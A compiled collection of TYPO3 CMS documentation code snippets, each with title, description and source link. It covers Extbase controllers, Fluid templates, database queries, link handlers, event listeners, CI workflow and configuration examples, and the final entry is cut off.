https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace Vendor\\Extension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Http\\ForwardResponse;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass PostController extends ActionController\n{\n    /**\n     * action index\n     *\n     * @return ResponseInterface\n     */\n    public function indexAction(): ResponseInterface\n    {\n        if ($blogNotFound) {\n            return new ForwardResponse('index', 'Blog');\n        }\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering Link Field in Fluid Template\nDESCRIPTION: This snippet shows how to render a link stored in a backend field (like header_link) using the f:link.typolink ViewHelper in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<f:link.typolink parameter=\"{myContent.header_link}\">\n  {myContent.header_link}\n</f:link.typolink>\n```\n\n----------------------------------------\n\nTITLE: Retrieving Context object via Dependency Injection in TYPO3 PHP\nDESCRIPTION: Demonstrates how to obtain the Context object using dependency injection in a TYPO3 controller class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Context\\Context;\n\nclass MyController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Error Handling for Production Environment in PHP\nDESCRIPTION: PHP configuration for a production environment that restricts error display to specific IP addresses and reduces error logging to warnings and above. This setup focuses on security by hiding system information from users.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$changeSettings['SYS'] = [\n  'displayErrors' => -1,\n  'devIPmask' => '[your.IP.address]',\n  'errorHandler' => 'TYPO3\\\\CMS\\\\Core\\\\Error\\\\ErrorHandler',\n  'belogErrorReporting' => '0',\n];\n\n$GLOBALS['TYPO3_CONF_VARS'] = array_replace_recursive($GLOBALS['TYPO3_CONF_VARS'], $changeSettings);\n```\n\n----------------------------------------\n\nTITLE: Retrieving Icons in JavaScript with ES6 Module\nDESCRIPTION: Example of how to use the TYPO3 JavaScript Icon API to fetch icons dynamically. The snippet demonstrates importing the Icons module and using the getIcon() method with various parameters including size and state options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Icon/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport Icons from '@typo3/backend/icons.js';\n\nclass MyEs6Module {\n    constructor() {\n        // Get a single icon\n        Icons.getIcon('spinner-circle-light', Icons.sizes.small, null, 'disabled').then((icon: string): void => {\n            console.log(icon);\n        });\n    }\n}\n\nexport default new MyEs6Module();\n```\n\n----------------------------------------\n\nTITLE: Requesting and Using a TYPO3 Service Object in PHP\nDESCRIPTION: This snippet demonstrates how to request a TYPO3 service object of type 'textLang' and use its 'guessLanguage' method. It highlights the use of GeneralUtility::makeInstanceService() to obtain the service object and checks if a valid object is returned before using it.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/SimpleUse.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nif (is_object($serviceObject = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstanceService('textLang'))) {\n\t$language = $serviceObject->guessLanguage($text);\n}\n```\n\n----------------------------------------\n\nTITLE: Executing INSERT Query with QueryBuilder in TYPO3 CMS\nDESCRIPTION: Demonstrates how to create and execute an INSERT query using the QueryBuilder. It shows setting the table and values to be inserted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: PHP\nCODE:\n```\n// INSERT INTO `tt_content` (`bodytext`, `header`) VALUES ('lorem', 'dolor')\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$affectedRows = $queryBuilder\n    ->insert('tt_content')\n    ->values([\n        'bodytext' => 'lorem',\n        'header' => 'dolor',\n    ])\n    ->executeStatement();\n```\n\n----------------------------------------\n\nTITLE: Adding Query Arguments to TYPO3 AjaxRequest (JavaScript)\nDESCRIPTION: Demonstrates how to add query arguments to an AjaxRequest using the withQueryArguments() method. This method allows for programmatic generation of query strings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/AjaxRequest/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst request = new AjaxRequest('https://example.org/api/endpoint')\n  .withQueryArguments({\n    foo: 'bar',\n    baz: ['a', 'b', 'c']\n  });\n```\n\n----------------------------------------\n\nTITLE: Implementing a PHP GitHubLinkHandler class for TYPO3\nDESCRIPTION: A PHP class that implements the LinkHandlerInterface to create GitHub links in TYPO3. It includes methods for handling parameters, content rendering, and link formatting for GitHub repository references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/CustomLinkHandlers.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\LinkHandler;\n\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Form\\NodeFactory;\nuse TYPO3\\CMS\\Backend\\LinkHandler\\LinkHandlerInterface;\nuse TYPO3\\CMS\\Backend\\View\\BackendViewFactory;\nuse TYPO3\\CMS\\Core\\Page\\JavaScriptModuleInstruction;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Utility\\StringUtility;\nuse TYPO3\\CMS\\Recordlist\\Controller\\AbstractLinkBrowserController;\n\n/**\n * Link handler for GitHub links\n */\nclass GitHubLinkHandler implements LinkHandlerInterface\n{\n    // Defines the JavaScript function to use\n    protected string $identifier = 'github';\n\n    /**\n     * @var array<string, string>\n     */\n    protected array $linkAttributes = [\n        'href',\n        'target',\n        'class',\n        'params',\n        'title',\n    ];\n\n    /**\n     * Parts of the current link\n     */\n    protected array $linkParts = [];\n\n    /**\n     * @var array<string, string>\n     */\n    protected array $configuration;\n\n    protected AbstractLinkBrowserController $linkBrowser;\n\n    /**\n     * We don't want to initialize this object on our own,\n     * but with a factory method from the controller\n     */\n    public function __construct(AbstractLinkBrowserController $linkBrowser, array $configuration)\n    {\n        $this->linkBrowser = $linkBrowser;\n        $this->configuration = $configuration;\n    }\n\n    /**\n     * Checks if this is the handler for the given link\n     *\n     * Also stores information locally about the link attributes including\n     * the href from the \t\n     */\n    public function canHandleLink(array $linkParts): bool\n    {\n        // This handler is good for GitHub links only\n        // href here: github:123\n        if (isset($linkParts['href']) && str_starts_with($linkParts['href'], $this->identifier . ':')) {\n            $this->linkParts = $linkParts;\n            return true;\n        }\n        return false;\n    }\n\n    /**\n     * Builds the RTE required JavaScript settings for this element.\n     */\n    public function getBodyTagAttributes(): array\n    {\n        // @todo getOnClickEvent got removed with TYPO3 v12.0, so use different approach\n        $attributes = [\n            'data-trigger-browser' => 'github',\n            'data-mode' => 'github',\n            'data-dispatch-browser-command' => 'github',\n        ];\n        return $attributes;\n    }\n\n    /**\n     * Returns the JS module instruction that needs to be added to\n     * link a JavaScript module for this handler.\n     */\n    public function getJavaScriptModuleInstructions(): array\n    {\n        return [JavaScriptModuleInstruction::create('@t3docs/examples/github-link-handler.js')];\n    }\n\n    /**\n     * Renders a view for showing results and allowing a user to choose a link\n     */\n    public function render(ServerRequestInterface $request): string\n    {\n        $backendView = GeneralUtility::makeInstance(BackendViewFactory::class)\n            ->create($request, ['t3docs/examples']);\n        $backendView->assignMultiple([\n            'identifier' => htmlspecialchars($this->identifier),\n            'link' => $this->linkParts['href'] ?? '',\n            'action' => $this->linkBrowser->getRequest()->getAttribute('normalizedParams')\n                ->getRequestUri(),\n        ]);\n        return $backendView->render('LinkBrowser/GitHub');\n    }\n\n    /**\n     * Format the current link value in a human-readable way\n     */\n    public function formatCurrentUrl(): string\n    {\n        $value = ltrim($this->linkParts['href'] ?? '', $this->identifier . ':');\n        return htmlspecialchars($value);\n    }\n\n    /**\n     * Return the list of link attributes\n     */\n    public function getLinkAttributes(): array\n    {\n        return $this->linkAttributes;\n    }\n\n    /**\n     * We don't validate as we know what we are doing\n     */\n    public function isUpdateSupported(): bool\n    {\n        return false;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Link Handler in TYPO3 TSConfig\nDESCRIPTION: This TSConfig snippet defines a custom link handler for GitHub in TYPO3. It specifies the handler class, label, display position, and configuration options including the GitHub project and action.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_PageTsConfig.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler {\n   github {\n      handler = T3docs\\Examples\\LinkHandler\\GitHubLinkHandler\n      label = LLL:EXT:examples/Resources/Private/Language/locallang_browse_links.xlf:github\n      displayAfter = haiku\n      scanBefore = url\n      configuration {\n         project = TYPO3-Documentation/TYPO3CMS-Reference-CoreApi\n         action = issues\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Continuous Integration with GitHub Actions\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to execute tests for TYPO3 extensions. It sets up a matrix of PHP versions and dependency settings, ensuring comprehensive testing across different environments. The workflow runs unit and functional tests, and validates PHP and composer setups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nname: CI\n\non: [push, pull_request]\n\njobs:\n\n  testsuite:\n    name: all tests\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        php: [ '8.1', '8.2' ]\n        minMax: [ 'composerInstallMin', 'composerInstallMax' ]\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v2\n\n      - name: Composer\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s ${{ matrix.minMax }}\n\n      - name: Composer validate\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s composerValidate\n\n      - name: Lint PHP\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s lint\n\n      - name: Unit tests\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s unit\n\n      - name: Functional tests with mariadb\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d mariadb -s functional\n\n      - name: Functional tests with postgres\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d postgres -s functional\n\n      - name: Functional tests with sqlite\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d sqlite -s functional\n```\n\n----------------------------------------\n\nTITLE: Using Placeholders in Log Messages in TYPO3\nDESCRIPTION: Example of using PSR-3 compatible placeholders in log messages in TYPO3. This is the recommended way to include variable data in log messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$this->logger->alert(\n    'Password reset requested for email \"{email}\" but was requested too many times.',\n    ['email' => $emailAddress]\n);\n```\n\n----------------------------------------\n\nTITLE: Defining AfterTypoScriptDeterminedEvent Class Interface in TYPO3 Frontend\nDESCRIPTION: Defines the AfterTypoScriptDeterminedEvent class interface that provides access to the FrontendTypoScript object after it has been determined. The event is crucial for middlewares that need to react to TypoScript configuration without modifying it.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterTypoScriptDeterminedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass AfterTypoScriptDeterminedEvent\n{\n    public function getFrontendTypoScript(): \\TYPO3\\CMS\\Core\\TypoScript\\FrontendTypoScript;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Simple Flash Message in Extbase Controller (PHP)\nDESCRIPTION: Demonstrates how to add a basic flash message in an Extbase controller. This method adds a success message to the default flash message queue.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Extbase.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$this->addFlashMessage('This is a simple success message');\n```\n\n----------------------------------------\n\nTITLE: Updating TYPO3 Extbase Template to Use POST Forms for Delete Actions\nDESCRIPTION: This template revision demonstrates changing Extbase controller links from GET-based to POST-based form submissions in a TYPO3 backend module, ensuring that state-changing operations use POST requests for better security.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/SecurityConsiderations.rst#2025-04-16_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n<ul>\n<f:for each=\"{things}\" as=\"thing\">\n    <li>\n        {thing.name}:\n-         <f:link.action\n-             name=\"delete\" controller=\"Module\"\n-             arguments=\"{thing: thing}\"\n-             class=\"btn btn-default\">delete</f:link.action>\n+         <f:form.button\n+             name=\"thing\" value=\"{thing.uid}\"\n+             type=\"submit\" form=\"demo-module-form-delete-action\"\n+             class=\"btn btn-default\">delete</f:form.button>\n    </li>\n</f:for>\n</ul>\n+ <f:form\n+     action=\"delete\" controller=\"Module\" method=\"post\"\n+     id=\"demo-module-form-delete-action\" class=\"hidden\" />\n```\n\n----------------------------------------\n\nTITLE: Accessing XLIFF Labels in PHP with LanguageService\nDESCRIPTION: Shows how to retrieve a localized string in PHP using the LanguageService. The method sL() accesses a label from an XLIFF file using the LLL syntax. Note that htmlspecialchars() must be applied manually for web output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/XliffApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$this->getLanguageService()->sL('LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:labels.minutesHoursDaysYears')\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::repeat() in TYPO3 Repository (PHP)\nDESCRIPTION: Demonstrates the use of the repeat() function in a TYPO3 repository to create a repeated string value. It shows how to use QueryBuilder to generate a SELECT statement with a repeated value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findRepeatedValues(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->repeat(\n                $queryBuilder->expr()->literal('a'),\n                5\n            ),\n            'repeated_value'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: Truncating Tables with Connection in TYPO3\nDESCRIPTION: Example of using the truncate() method to empty a table from a repository class. This method is faster than using delete() for removing all rows and typically resets auto increment primary keys to zero.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\npublic function truncateMyTable(): void\n{\n    $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);\n    $connection = $connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->truncate('tx_myextension_domain_model_mytable');\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Static Text Route in TYPO3 CMS YAML\nDESCRIPTION: This snippet demonstrates how to configure a static route to deliver simple text content, such as robots.txt or humans.txt, using the staticText option in the TYPO3 site configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/StaticRoutes.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nroutes:\n  - route: robots.txt\n    type: staticText\n    content: |\n      User-agent: *\n      Allow: /\n      Disallow: /typo3/\n      Disallow: /typo3conf/\n      Sitemap: https://example.org/sitemap.xml\n```\n\n----------------------------------------\n\nTITLE: Extending Existing Table in SQL for TYPO3 News Extension\nDESCRIPTION: SQL definition that extends the tt_content table with additional fields for the news extension. It adds a field for related news items and creates an index for that field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseUpgrade/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tt_content (\n    tx_news_related_news int(11) DEFAULT '0' NOT NULL,\n    KEY index_newscontent (tx_news_related_news)\n);\n```\n\n----------------------------------------\n\nTITLE: TYPO3 User Authentication Service Chain Implementation\nDESCRIPTION: Demonstrates how to implement a service chain for user authentication in TYPO3. The code iterates through authentication services to find and validate users, with the ability to stop after finding the first match or continue searching based on configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/ServiceChain.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n// Use 'auth' service to find the user\n// First found user will be used\n$subType = 'getUser' . $this->loginType;\n/** @var AuthenticationService $serviceObj */\nforeach ($this->getAuthServices($subType, $loginData, $authInfo) as $serviceObj) {\n    if ($row = $serviceObj->getUser()) {\n        $tempuserArr[] = $row;\n        $this->logger->debug('User found', [\n            $this->userid_column => $row[$this->userid_column],\n            $this->username_column => $row[$this->username_column],\n        ]);\n        // User found, just stop to search for more if not configured to go on\n        if (empty($authConfiguration[$this->loginType . '_fetchAllUsers'])) {\n            break;\n        }\n    }\n}\n\nprotected function getAuthServices(string $subType, array $loginData, array $authInfo): \\Traversable\n{\n   $serviceChain = [];\n   while (is_object($serviceObj = GeneralUtility::makeInstanceService('auth', $subType, $serviceChain))) {\n      $serviceChain[] = $serviceObj->getServiceKey();\n      $serviceObj->initAuth($subType, $loginData, $authInfo, $this);\n      yield $serviceObj;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: AfterFormDefinitionLoadedEvent Class Methods in TYPO3 Form Component\nDESCRIPTION: Defines the AfterFormDefinitionLoadedEvent class which allows listeners to modify loaded form definitions. Provides methods to get and set the form definition, retrieve the persistence identifier, and get the cache key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Form/AfterFormDefinitionLoadedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Form\\Mvc\\Persistence\\Event;\n\nclass AfterFormDefinitionLoadedEvent\n{\n    public function getFormDefinition(): array;\n    \n    public function setFormDefinition(array $formDefinition);\n    \n    public function getPersistenceIdentifier(): string;\n    \n    public function getCacheKey(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Functional Test Case Setup Method\nDESCRIPTION: Default implementation of setUp() method that creates a new TYPO3 instance, sets up database, loads extensions, and prepares test environment\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Introduction.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nsetUp()\n```\n\n----------------------------------------\n\nTITLE: Registering Event Listener in YAML for TYPO3 Extension\nDESCRIPTION: This YAML configuration registers the event listener class with the TYPO3 event system. It specifies the event to listen for and the class that should handle the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Events/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\EventListener\\Joh316PasswordInvalidator:\n    tags:\n      - name: event.listener\n        identifier: 'myextension/auth/password-invalidator'\n        method: '__invoke'\n        event: TYPO3\\CMS\\Core\\Authentication\\Event\\PasswordChangeEvent\n```\n\n----------------------------------------\n\nTITLE: Defining Backend Routes in TYPO3 CMS Extension\nDESCRIPTION: Example of defining backend routes in an extension's Configuration/Backend/Routes.php file. Shows route configuration with path, target controller, and optional access settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    // Login screen of the TYPO3 Backend\n    'login' => [\n        'path' => '/login',\n        'access' => 'public',\n        'target' => \\TYPO3\\CMS\\Backend\\Controller\\LoginController::class . '::formAction'\n    ],\n    // Main backend rendering setup (previously called backend.php)\n    'main' => [\n        'path' => '/main',\n        'target' => \\TYPO3\\CMS\\Backend\\Controller\\BackendController::class . '::mainAction'\n    ],\n    // ...\n];\n\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Fluid Template with Debug Output\nDESCRIPTION: Implements a TYPO3 Fluid template that displays content element data and includes debug information. The template shows how to use the Fluid namespace, debug viewhelper for inspecting variables, and format.html viewhelper for rendering HTML content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/CustomContentElements/CustomContentElement.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html data-namespace-typo3-fluid=\"true\"\n         xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\">\n      <h2>Data available to the content element: </h2>\n      <f:debug inline=\"true\">{_all}</f:debug>\n      <h2>Output</h2>\n      <div><f:format.html>{data.bodytext}</f:format.html></div>\n   </html>\n```\n\n----------------------------------------\n\nTITLE: Debugging SQL Queries with Extbase DebuggerUtility in TYPO3\nDESCRIPTION: Example showing how to debug SQL queries by using Extbase's DebuggerUtility to output the raw SQL before execution. This helps troubleshoot database-related issues in TYPO3 extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Debugging/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Extbase\\Utility\\DebuggerUtility::var_dump($queryBuilder->getSQL());\n```\n\n----------------------------------------\n\nTITLE: Overriding XLIFF Files using TYPO3_CONF_VARS Configuration\nDESCRIPTION: PHP configuration for overriding default XLIFF language files in TYPO3 using the locallangXMLOverride setting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['locallangXMLOverride']['EXT:backend/Resources/Private/Language/locallang_mod_administration.xlf'][] = 'EXT:examples/Resources/Private/Language/Overrides/locallang_mod_administration.xlf';\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['locallangXMLOverride']['de']['EXT:backend/Resources/Private/Language/locallang_mod_administration.xlf'][] = 'EXT:examples/Resources/Private/Language/Overrides/de.locallang_modadministration.xlf';\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Controller with PSR-7 Response in PHP\nDESCRIPTION: A TeaController class that extends ActionController and implements a showAction method. The method accepts a Tea model parameter, assigns it to the view, and returns an HTML response using PSR-7 ResponseInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/_Controller/_ShowAction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TTN\\Tea\\Domain\\Model\\Product\\Tea;\n\nclass TeaController extends ActionController\n{\n    public function showAction(Tea $tea): ResponseInterface\n    {\n        $this->view->assign('tea', $tea);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ModifyEditFormUserAccessEvent Class Definition in PHP\nDESCRIPTION: PHP class that provides methods to control and check user access for FormEngine operations. It includes methods for allowing/denying access, checking access state, and retrieving record information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyEditFormUserAccessEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyEditFormUserAccessEvent\n{\n    public function allowUserAccess(): void\n    \n    public function denyUserAccess(): void\n    \n    public function doesUserHaveAccess(): bool\n    \n    public function getAccessDeniedException(): ?\\TYPO3\\CMS\\Backend\\Form\\Exception\\AccessDeniedException\n    \n    public function getTableName(): string\n    \n    public function getCommand(): string // returns \"new\" or \"edit\"\n    \n    public function getDatabaseRow(): array\n}\n```\n\n----------------------------------------\n\nTITLE: Using Integer Validator with Attribute in PHP\nDESCRIPTION: Example of using the Integer validator attribute on a property to validate that a value is an integer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n#[Validate(['validator' => 'Integer'])]\nprotected mixed $quantity;\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyNewContentElementWizardItemsEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener that modifies the content element wizard items. Shows how to handle the ModifyNewContentElementWizardItemsEvent and manipulate wizard items.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyNewContentElementWizardItemsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\ModifyNewContentElementWizardItemsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyNewContentElementWizardItemsEvent $event): void\n    {\n        $wizardItems = $event->getWizardItems();\n\n        // Remove an existing item\n        unset($wizardItems['common_bullets']);\n\n        // Add a new custom item\n        $wizardItems['my_custom_item'] = [\n            'iconIdentifier' => 'content-text',\n            'title' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:my_custom_item',\n            'description' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:my_custom_item.description',\n            'tt_content_defValues' => [\n                'CType' => 'my_custom_item',\n            ],\n        ];\n\n        $event->setWizardItems($wizardItems);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Single Database Connection in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates how to configure a single default database connection in TYPO3's settings.php file. It specifies connection details such as charset, database name, driver, host, password, port, and user.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'DB' => [\n    'Connections' => [\n        'Default' => [\n            'charset' => 'utf8',\n            'dbname' => 'theDatabaseName',\n            'driver' => 'mysqli',\n            'host' => 'theHost',\n            'password' => 'theConnectionPassword',\n            'port' => 3306,\n            'user' => 'theUser',\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Passing Complete Objects to cObject ViewHelper\nDESCRIPTION: Shows how to pass entire objects to the cObject ViewHelper for more complex data handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n{post -> f:cObject(typoscriptObjectPath: 'lib.myCounter')}\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Transport Server - TYPO3 PHP\nDESCRIPTION: This snippet defines the SMTP server settings for email transport, including the server address and port. Defaults to 'localhost:25'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_server'] = 'localhost:25';\n```\n\n----------------------------------------\n\nTITLE: Page Layout Template in HTML\nDESCRIPTION: Shows a Fluid layout file that serves as the base structure for all pages in a TYPO3 site package, including common elements like header and footer.\nSOURCE: 